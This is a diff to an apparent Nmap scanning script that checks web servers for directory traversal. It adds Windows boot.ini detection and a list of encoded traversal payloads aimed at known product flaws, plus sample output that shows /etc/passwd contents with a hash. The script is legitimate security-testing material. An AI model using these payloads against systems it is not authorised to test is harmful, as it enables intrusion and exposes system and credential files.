@@ -1,23 +1,30 @@
 description = [[
 Checks if a web server is vulnerable to directory traversal by attempting to
-retrieve <code>/etc/passwd</code> using various traversal methods such as
+retrieve <code>/etc/passwd</code> or <code>\boot.ini</code> using various traversal methods such as
 requesting <code>../../../../etc/passwd</code>.
 ]]
 
 ---
 -- @output
--- PORT   STATE SERVICE
 -- 80/tcp open  http
--- | http-passwd: Found with "//etc/passwd"
+-- | http-passwd: Directory traversal found.
+-- | Payload: "index.html?../../../../../boot.ini"
 -- | Printing first 250 bytes:
--- | root:x:0:0:root:/root:/bin/bash
--- | daemon:x:1:1:daemon:/usr/sbin:/bin/sh
--- | bin:x:2:2:bin:/bin:/bin/sh
--- | sys:x:3:3:sys:/dev:/bin/sh
--- | sync:x:4:65534:sync:/bin:/bin/sync
--- | games:x:5:60:games:/usr/games:/bin/sh
--- | man:x:6:12:man:/var/cache/man:/bin/sh
--- |_lp:x:7:7:lp:/va
+-- | [boot loader]
+-- | timeout=30
+-- | default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+-- | [operating systems]
+-- |_multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+--
+--
+-- 80/tcp open  http
+-- | http-passwd: Directory traversal found.
+-- | Payload: "../../../../../../../../../../etc/passwd"
+-- | Printing first 250 bytes:
+-- | root:$1$$iems.VX5yVMByaB1lT8fx.:0:0::/:/bin/sh
+-- | sshd:*:65532:65534::/:/bin/false
+-- | ftp:*:65533:65534::/:/bin/false
+-- |_nobody:*:65534:65534::/:/bin/false
 
 -- 07/20/2007:
 --   * Used Thomas Buchanan's HTTPAuth script as a starting point
@@ -26,8 +33,14 @@ requesting <code>../../../../etc/passwd</code>.
 -- 01/31/2008:
 --   * Rewritten to use Sven Klemm's excellent HTTP library and to do some much
 --     needed cleaning up
+--
+-- 06/2010:
+--   * Added Microsoft Windows (XP and previous) support by also looking for
+--     \boot.ini
+--   * Added specific payloads according to vulnerabilities published against
+--     various specific products.
 
-author = "Kris Katterjohn"
+author = "Kris Katterjohn, Ange Gutek"
 
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 
@@ -37,7 +50,7 @@ require "shortport"
 require "http"
 
 --- Validates the HTTP response code and checks for a <code>valid</code> passwd
--- format in the body.
+-- or Windows Boot Loader format in the body.
 --@param response The HTTP response from the server.
 --@return The body of the HTTP response.
 local validate = function(response)
@@ -49,11 +62,12 @@ local validate = function(response)
 		return nil
 	end
 
-	if not response.body:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") then
-		return nil
+	if response.body:match("^[^:]+:[^:]*:[0-9]+:[0-9]+:") or response.body:match("\[boot loader\]") then
+													  return response.body
+	
 	end
 
-	return response.body
+	return nil
 end
 
 --- Transforms a string with ".", "/" and "\" converted to their URL-formatted
@@ -68,8 +82,8 @@ local hexify = function(str)
 	return ret
 end
 
---- Truncates the <code>passwd</code> file.
---@param passwd <code>passwd</code> file.
+--- Truncates the <code>passwd</code> or <code>boot.ini</code> file.
+--@param passwd <code>passwd</code> or <code>boot.ini</code>file.
 --@return Truncated passwd file and truncated length.
 local truncatePasswd = function(passwd)
 	local len = 250
@@ -77,13 +91,13 @@ local truncatePasswd = function(passwd)
 end
 
 --- Formats output.
---@param passwd <code>passwd</code> file.
+--@param passwd <code>passwd</code> or <code>boot.ini</code> file.
 --@param dir Formatted request which elicited the good reponse.
 --@return String description for output
 local output = function(passwd, dir)
 	local trunc, len = truncatePasswd(passwd)
 	local out = ""
-	out = out .. "Found with \"" .. dir .. "\"\n"
+	out = out .. "Directory traversal found.\nPayload: \"" .. dir .. "\"\n"
 	out = out .. "Printing first " .. len .. " bytes:\n"
 	out = out .. trunc
 	return out
@@ -93,21 +107,31 @@ portrule = shortport.port_or_service({80, 443, 8080}, {"http", "https"})
 
 action = function(host, port)
 	local dirs = {
-		"//etc/passwd",
-		string.rep("../", 10) .. "etc/passwd",
-		"." .. string.rep("../", 10) .. "etc/passwd",
-		string.rep("..\\/", 10) .. "etc\\/passwd",
-		string.rep("..\\", 10) .. "etc\\passwd"
+		hexify("//etc/passwd"),
+		hexify(string.rep("../", 10) .. "etc/passwd"),
+		hexify(string.rep("../", 10) .. "boot.ini"),
+		hexify(string.rep("..\\", 10) .. "boot.ini"),
+		hexify("." .. string.rep("../", 10) .. "etc/passwd"),
+		hexify(string.rep("..\\/", 10) .. "etc\\/passwd"),
+		hexify(string.rep("..\\", 10) .. "etc\\passwd"),
+
+		-- These don't get hexified because they are targeted at
+		-- specific known vulnerabilities.
+		'%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./boot.ini',
+		'%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini',
+		'\\\\..%2f..%2f..%2f..%2fboot.ini% ../',
+		'index.html?../../../../../boot.ini',
+		'index.html?..\\..\\..\\..\\..\\boot.ini',
+		'..\\\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\\\boot.ini',
+		'///..%2f..%2f..%2f..%2fboot.ini',
+		'/..%5C..%5C%5C..%5C..%5C%5C..%5C..%5C%5C..%5C..%5Cboot.ini'
 	}
 
 	for _, dir in ipairs(dirs) do
-		local response = http.get(host, port, hexify(dir))
+		local response = http.get(host, port, dir)
 
 		if validate(response) then
 			return output(response.body, dir)
 		end
 	end
-
-	return
 end
-
